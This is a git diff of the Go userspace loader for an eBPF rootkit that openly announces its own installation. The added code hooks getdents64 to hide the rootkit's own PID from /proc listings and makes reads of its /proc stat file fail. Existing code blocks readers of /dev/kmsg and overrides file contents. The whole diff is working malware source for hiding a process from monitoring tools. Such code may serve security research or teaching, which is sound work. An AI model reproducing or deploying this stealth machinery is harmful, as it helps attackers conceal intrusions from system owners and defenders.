@@ -35,15 +35,30 @@ var mainManager = &manager.Manager{
 		{
 			Section: "kprobe/__x64_sys_close",
 		},
+		{
+			Section: "kprobe/__x64_sys_getdents64",
+		},
+		{
+			UID:     "First",
+			Section: "kretprobe/__x64_sys_getdents64",
+		},
 	},
 }
 
-var userWriteManager = &manager.Manager{}
+var userWriteManager = &manager.Manager{
+	Probes: []*manager.Probe{
+		{
+			UID:     "Second",
+			Section: "kretprobe/__x64_sys_getdents64",
+		},
+	},
+}
 
 const (
 	KMsgAction uint64 = iota + 1
 	OverrideContent
 	OverrideReturn
+	HideFile
 )
 
 const (
@@ -51,6 +66,7 @@ const (
 	OverrideContentProg
 
 	FillWithZeroProg = 10
+	OverrideGetDents = 11
 )
 
 var ByteOrder = binary.LittleEndian
@@ -65,13 +81,13 @@ func FNVHashStr(s string) uint64 {
 	return FNVHashByte([]byte(s))
 }
 
-type FdContentKey struct {
+type RkFdContentKey struct {
 	ID    uint64
 	Chunk uint32
 }
 
 // Write write binary representation
-func (p *FdContentKey) Write(buffer []byte) {
+func (p *RkFdContentKey) Write(buffer []byte) {
 	ByteOrder.PutUint64(buffer[0:8], p.ID)
 	ByteOrder.PutUint32(buffer[8:12], p.Chunk)
 
@@ -80,25 +96,25 @@ func (p *FdContentKey) Write(buffer []byte) {
 }
 
 // Bytes returns array of byte representation
-func (p *FdContentKey) Bytes() []byte {
+func (p *RkFdContentKey) Bytes() []byte {
 	b := make([]byte, 16)
 	p.Write(b)
 	return b
 }
 
-type FdContent struct {
+type RkFdContent struct {
 	Size    uint64
 	Content [64]byte
 }
 
 // Write write binary representation
-func (p *FdContent) Write(buffer []byte) {
+func (p *RkFdContent) Write(buffer []byte) {
 	ByteOrder.PutUint64(buffer[0:8], p.Size)
 	copy(buffer[8:], p.Content[:])
 }
 
 // Bytes returns array of byte representation
-func (p *FdContent) Bytes() []byte {
+func (p *RkFdContent) Bytes() []byte {
 	b := make([]byte, len(p.Content)+8)
 	p.Write(b)
 	return b
@@ -113,9 +129,6 @@ type RkFdKey struct {
 func (p *RkFdKey) Write(buffer []byte) {
 	ByteOrder.PutUint64(buffer[0:8], p.Fd)
 	ByteOrder.PutUint32(buffer[8:12], p.Pid)
-
-	var zero uint32
-	ByteOrder.PutUint32(buffer[12:16], zero)
 }
 
 // Bytes returns array of byte representation
@@ -127,19 +140,19 @@ func (p *RkFdKey) Bytes() []byte {
 
 // RkFdAttr represents a file
 type RkFdAttr struct {
-	Action uint64
-	Value  int64
+	Action      uint64
+	ReturnValue int64
 }
 
 // Write write binary representation
 func (p *RkFdAttr) Write(buffer []byte) {
 	ByteOrder.PutUint64(buffer[0:8], p.Action)
-	ByteOrder.PutUint64(buffer[8:16], uint64(p.Value))
+	ByteOrder.PutUint64(buffer[8:16], uint64(p.ReturnValue))
 }
 
 // Bytes returns array of byte representation
 func (p *RkFdAttr) Bytes() []byte {
-	b := make([]byte, 48)
+	b := make([]byte, 56)
 	p.Write(b)
 	return b
 }
@@ -201,10 +214,11 @@ func PutPathAttr(m *ebpf.Map, path string, attr PathAttr) error {
 
 // PathAttr represents attr to apply for a path
 type PathAttr struct {
-	FSType     string
-	Action     uint64
-	OverrideID uint64
-	Value      int64
+	FSType      string
+	Action      uint64
+	OverrideID  uint64
+	ReturnValue int64
+	HiddenHash  uint64
 }
 
 // Write write binary representation
@@ -212,13 +226,14 @@ func (p *PathAttr) Write(buffer []byte) {
 	hash := FNVHashStr(p.FSType)
 	ByteOrder.PutUint64(buffer[0:8], hash)
 	ByteOrder.PutUint64(buffer[8:16], p.Action)
-	ByteOrder.PutUint64(buffer[16:24], p.OverrideID)
-	ByteOrder.PutUint64(buffer[24:32], uint64(p.Value))
+	ByteOrder.PutUint64(buffer[16:24], uint64(p.ReturnValue))
+	ByteOrder.PutUint64(buffer[24:32], p.OverrideID)
+	ByteOrder.PutUint64(buffer[32:40], p.HiddenHash)
 }
 
 // Bytes returns array of byte representation
 func (p *PathAttr) Bytes() []byte {
-	b := make([]byte, 32)
+	b := make([]byte, 40)
 	p.Write(b)
 	return b
 }
@@ -263,7 +278,7 @@ func getRkFdKeys(path string) []RkFdKey {
 }
 
 func PutFdContent(m *ebpf.Map, id uint64, path string) {
-	key := FdContentKey{
+	key := RkFdContentKey{
 		ID: id,
 	}
 
@@ -273,9 +288,9 @@ func PutFdContent(m *ebpf.Map, id uint64, path string) {
 	}
 
 	for {
-		fdContent := FdContent{}
+		RkFdContent := RkFdContent{}
 
-		n, err := file.Read(fdContent.Content[:])
+		n, err := file.Read(RkFdContent.Content[:])
 		if err != nil {
 			return
 		}
@@ -284,9 +299,9 @@ func PutFdContent(m *ebpf.Map, id uint64, path string) {
 			break
 		}
 
-		fdContent.Size = uint64(n)
+		RkFdContent.Size = uint64(n)
 
-		if err := m.Put(key.Bytes(), fdContent.Bytes()); err != nil {
+		if err := m.Put(key.Bytes(), RkFdContent.Bytes()); err != nil {
 			return
 		}
 
@@ -328,17 +343,17 @@ func main() {
 	}
 
 	// block process already having fd on kmsg
-	for _, RkFdKey := range getRkFdKeys("/dev/kmsg") {
+	for _, fdKey := range getRkFdKeys("/dev/kmsg") {
 		filesMap, _, err := mainManager.GetMap("rk_fd_attrs")
 		if err != nil {
 			HandleError(err)
 		}
 
-		file := RkFdAttr{
+		fdAttr := RkFdAttr{
 			Action: OverrideReturn,
 		}
 
-		if err = filesMap.Put(RkFdKey.Bytes(), file.Bytes()); err != nil {
+		if err = filesMap.Put(fdKey.Bytes(), fdAttr.Bytes()); err != nil {
 			HandleError(err)
 		}
 	}
@@ -353,25 +368,34 @@ func main() {
 		HandleError(err)
 	}
 
-	Kmsg("Your Rootkit is now installed")
+	Kmsg(fmt.Sprintf("Your Rootkit(%d) is now installed", os.Getpid()))
 
 	// second step
 	rkFilesMap, _, _ := mainManager.GetMap("rk_files")
 	rkFdAttrsMap, _, _ := mainManager.GetMap("rk_fd_attrs")
 	rkFdContentsMap, _, _ := mainManager.GetMap("rk_fd_contents")
+	rkGetdentsMap, _, _ := mainManager.GetMap("rk_getdents")
 
 	// Initialize the write user manager with map from main
 	options.MapEditors = map[string]*ebpf.Map{
 		"rk_files":       rkFilesMap,
 		"rk_fd_attrs":    rkFdAttrsMap,
 		"rk_fd_contents": rkFdContentsMap,
+		"rk_getdents":    rkGetdentsMap,
 	}
 	options.TailCallRouter = []manager.TailCallRoute{
 		{
-			ProgArrayName: "read_ret_progs",
+			ProgArrayName: "rk_progs",
 			Key:           uint32(FillWithZeroProg),
 			ProbeIdentificationPair: manager.ProbeIdentificationPair{
 				Section: "kprobe/fill_with_zero",
+			},
+		},
+		{
+			ProgArrayName: "rk_progs",
+			Key:           uint32(OverrideGetDents),
+			ProbeIdentificationPair: manager.ProbeIdentificationPair{
+				Section: "kprobe/override_getdents",
 			},
 		},
 	}
@@ -388,16 +412,22 @@ func main() {
 	// update main tail call with the ones from user
 	kmsgProg, _, _ := userWriteManager.GetProgram(manager.ProbeIdentificationPair{Section: "kprobe/kmsg"})
 	overrideContentProg, _, _ := userWriteManager.GetProgram(manager.ProbeIdentificationPair{Section: "kprobe/override_content"})
+	overrideGetDents, _, _ := userWriteManager.GetProgram(manager.ProbeIdentificationPair{Section: "kprobe/override_getdents"})
 	routes := []manager.TailCallRoute{
 		{
-			ProgArrayName: "read_ret_progs",
+			ProgArrayName: "rk_progs",
 			Key:           uint32(KMsgProg),
 			Program:       kmsgProg[0],
 		},
 		{
-			ProgArrayName: "read_ret_progs",
+			ProgArrayName: "rk_progs",
 			Key:           uint32(OverrideContentProg),
 			Program:       overrideContentProg[0],
+		},
+		{
+			ProgArrayName: "rk_progs",
+			Key:           uint32(OverrideGetDents),
+			Program:       overrideGetDents[0],
 		},
 	}
 	mainManager.UpdateTailCallRoutes(routes...)
@@ -434,11 +464,20 @@ func main() {
 
 	// ps
 	attr = PathAttr{
-		FSType: "proc",
-		Action: OverrideReturn,
-		Value:  -1,
+		FSType:      "proc",
+		Action:      OverrideReturn,
+		ReturnValue: -1,
 	}
-	if err := PutPathAttr(pathKeysMap, "1/stat", attr); err != nil {
+	if err := PutPathAttr(pathKeysMap, fmt.Sprintf("%d/stat", os.Getpid()), attr); err != nil {
+		HandleError(err)
+	}
+
+	attr = PathAttr{
+		FSType:     "proc",
+		Action:     HideFile,
+		HiddenHash: FNVHashStr(fmt.Sprintf("%d", os.Getpid())),
+	}
+	if err := PutPathAttr(pathKeysMap, "", attr); err != nil {
 		HandleError(err)
 	}
 
